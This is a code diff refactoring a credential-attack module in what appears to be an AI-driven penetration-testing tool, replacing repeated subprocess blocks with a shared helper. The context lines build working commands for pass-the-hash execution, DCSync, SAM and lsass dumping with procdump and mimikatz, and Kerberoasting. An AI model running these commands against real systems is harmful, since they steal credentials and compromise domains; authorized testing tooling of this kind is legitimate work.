@@ -2,17 +2,15 @@
 
 from __future__ import annotations
 
-import re
 import shutil
-import subprocess
 import time
 from pathlib import Path
 from typing import Any
 
 from tools.credential_store import CredentialRecord, CredentialStore
 from tools.mcp_shared import _attempt_dir, check_targets_allowlist
-from tools.mcp_tools.registry import ToolContext, _run_with_pgrp_timeout
-from tools.validation_utils import validate_target_or_ip
+from tools.mcp_tools.registry import ToolContext, run_argv_captured
+from tools.validation_utils import validate_ntlm_hash, validate_target_or_ip
 
 
 def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
@@ -223,7 +221,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
         argv = [impacket_bin]
         if ntlm_hash.strip():
             h = ntlm_hash.strip()
-            if not re.fullmatch(r"[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?", h):
+            if not validate_ntlm_hash(h):
                 return "BLOCKED: ntlm_hash must be 32 hex chars (NT) or 64 hex chars with colon (LM:NT)."
             argv.extend(["-hashes", f":{h.split(':')[-1]}"])
         else:
@@ -235,27 +233,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
         attempt_dir, attempt_id = _attempt_dir(workspace)
         log_path = attempt_dir / f"{m}.log"
-        start = time.monotonic()
-        try:
-            returncode, out, err = _run_with_pgrp_timeout(
-                argv,
-                120,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-            )
-            output = (out + "\n" + err)[-4000:]
-            status = "completed" if returncode == 0 else "failed"
-        except subprocess.TimeoutExpired:
-            status = "timed_out"
-            output = f"{m} timed out after 120s"
-            returncode = None
-        except Exception as exc:  # ponytail: bare except intentional
-            status = "error"
-            output = str(exc)
-            returncode = None
-
-        elapsed = time.monotonic() - start
+        status, returncode, output, elapsed = run_argv_captured(argv, 120)
         return (
             f"LATERAL_EXEC_RESULT: {status}\n"
             f"ATTEMPT_ID: {attempt_id}\n"
@@ -317,24 +295,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 argv.extend(["-hashes", f":{h.split(':')[-1]}"])
 
             log_path = attempt_dir / "secretsdump.log"
-            try:
-                returncode, out, err = _run_with_pgrp_timeout(
-                    argv,
-                    300,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-                output = (out + "\n" + err)[-4000:]
-                status = "completed" if returncode == 0 else "failed"
-            except subprocess.TimeoutExpired:
-                status = "timed_out"
-                output = "secretsdump timed out after 300s"
-                returncode = None
-            except Exception as exc:  # ponytail: bare except intentional
-                status = "error"
-                output = str(exc)
-                returncode = None
+            status, returncode, output, _elapsed = run_argv_captured(argv, 300)
 
         elif m == "dcsync":
             # DCSync via impacket-secretsdump over DRSUAPI against a domain
@@ -368,24 +329,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 argv.extend(["-just-dc-user", tu])
             argv.extend(["-outputfile", str(attempt_dir / "ntds_hashes")])
 
-            try:
-                returncode, out, err = _run_with_pgrp_timeout(
-                    argv,
-                    300,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-                output = (out + "\n" + err)[-4000:]
-                status = "completed" if returncode == 0 else "failed"
-            except subprocess.TimeoutExpired:
-                status = "timed_out"
-                output = "dcsync timed out after 300s"
-                returncode = None
-            except Exception as exc:  # ponytail: bare except intentional
-                status = "error"
-                output = str(exc)
-                returncode = None
+            status, returncode, output, _elapsed = run_argv_captured(argv, 300)
 
         elif m == "sam_local":
             # Save registry hives then dump locally. ``&&`` chaining requires a
@@ -396,47 +340,13 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 f"reg save HKLM\\SYSTEM {attempt_dir / 'SYSTEM'} && "
                 f"impacket-secretsdump -sam {attempt_dir / 'SAM'} -system {attempt_dir / 'SYSTEM'} LOCAL"
             )
-            try:
-                returncode, out, err = _run_with_pgrp_timeout(
-                    ["bash", "-c", cmds],
-                    120,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-                output = (out + "\n" + err)[-4000:]
-                status = "completed" if returncode == 0 else "failed"
-            except subprocess.TimeoutExpired:
-                status = "timed_out"
-                output = "sam_local timed out after 120s"
-                returncode = None
-            except Exception as exc:  # ponytail: bare except intentional
-                status = "error"
-                output = str(exc)
-                returncode = None
+            status, returncode, output, _elapsed = run_argv_captured(["bash", "-c", cmds], 120)
 
         elif m == "mimikatz":
             mimikatz_bin = shutil.which("mimikatz") or shutil.which("mimikatz.exe") or "mimikatz.exe"
             # H1: argv list -- the mimikatz sub-commands are literal arguments.
             argv = [mimikatz_bin, "privilege::debug", "sekurlsa::logonpasswords", "lsadump::sam", "exit"]
-            try:
-                returncode, out, err = _run_with_pgrp_timeout(
-                    argv,
-                    120,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-                output = (out + "\n" + err)[-4000:]
-                status = "completed" if returncode == 0 else "failed"
-            except subprocess.TimeoutExpired:
-                status = "timed_out"
-                output = "mimikatz timed out after 120s"
-                returncode = None
-            except Exception as exc:  # ponytail: bare except intentional
-                status = "error"
-                output = str(exc)
-                returncode = None
+            status, returncode, output, _elapsed = run_argv_captured(argv, 120)
 
         elif m == "lsass":
             procdump = shutil.which("procdump") or shutil.which("procdump.exe") or "procdump.exe"
@@ -446,24 +356,7 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 f"{procdump} -accepteula -ma lsass.exe {dump_path} && "
                 f"{mimikatz_bin} 'sekurlsa::minidump {dump_path}' 'sekurlsa::logonpasswords' exit"
             )
-            try:
-                returncode, out, err = _run_with_pgrp_timeout(
-                    ["bash", "-c", cmds],
-                    120,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-                output = (out + "\n" + err)[-4000:]
-                status = "completed" if returncode == 0 else "failed"
-            except subprocess.TimeoutExpired:
-                status = "timed_out"
-                output = "lsass dump timed out after 120s"
-                returncode = None
-            except Exception as exc:  # ponytail: bare except intentional
-                status = "error"
-                output = str(exc)
-                returncode = None
+            status, returncode, output, _elapsed = run_argv_captured(["bash", "-c", cmds], 120)
 
         elapsed = time.monotonic() - start
         return (
@@ -523,27 +416,8 @@ def register_credential_tools(mcp: Any, *, ctx: ToolContext) -> None:
             argv.extend(["-hashes", f":{h.split(':')[-1]}"])
         argv.extend(["-outputfile", str(tickets_file)])
 
-        start = time.monotonic()
-        try:
-            returncode, out, err = _run_with_pgrp_timeout(
-                argv,
-                300,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-            )
-            output = (out + "\n" + err)[-4000:]
-            status = "completed" if returncode == 0 else "failed"
-        except subprocess.TimeoutExpired:
-            status = "timed_out"
-            output = "GetUserSPNs timed out after 300s"
-            returncode = None
-        except Exception as exc:  # ponytail: bare except intentional
-            status = "error"
-            output = str(exc)
-            returncode = None
+        status, returncode, output, elapsed = run_argv_captured(argv, 300)
 
-        elapsed = time.monotonic() - start
         file_size = tickets_file.stat().st_size if tickets_file.exists() else 0
 
         return (
